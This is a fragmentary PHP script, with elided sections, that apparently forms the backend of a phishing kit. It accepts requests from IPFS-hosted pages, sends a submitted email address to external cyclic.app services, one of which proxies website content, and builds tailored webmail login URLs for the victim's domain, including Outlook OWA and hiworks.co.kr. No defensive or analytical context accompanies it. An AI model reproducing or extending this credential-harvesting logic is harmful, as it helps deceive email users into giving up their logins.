<?php
// Enable CORS
header("Access-Control-Allow-Origin: https://ipfs.io");
...
if (strpos($email, 'aol.com') !== false) {
    ...
    $apiUrl1 = "https://agile-dog-lab-coat.cyclic.app/api/";
    $apiUrl2 = "https://sore-pink-meerkat.cyclic.app/proxy-website-content?email=" . urlencode($email);

    // Fetch the response from the first API based on the email address
    $apiEndpoint1 = $apiUrl1 . urlencode($email);
    ...
    if ($response1 !== false) {
        if (strpos($response1, 'hiworks.co.kr') !== false) {
        ...
        } elseif (strpos($response1, 'https://outlook.com') !== false || strpos($email, 'pphosted.com') !== false) {
            $loginUrl = 'https://outlook.com/owa/' . extractDomainFromEmail($email);
            ...
            $loginUrl = 'https://webmail.' . extractDomainFromEmail($email); // Replace with the appropriate domain extraction method
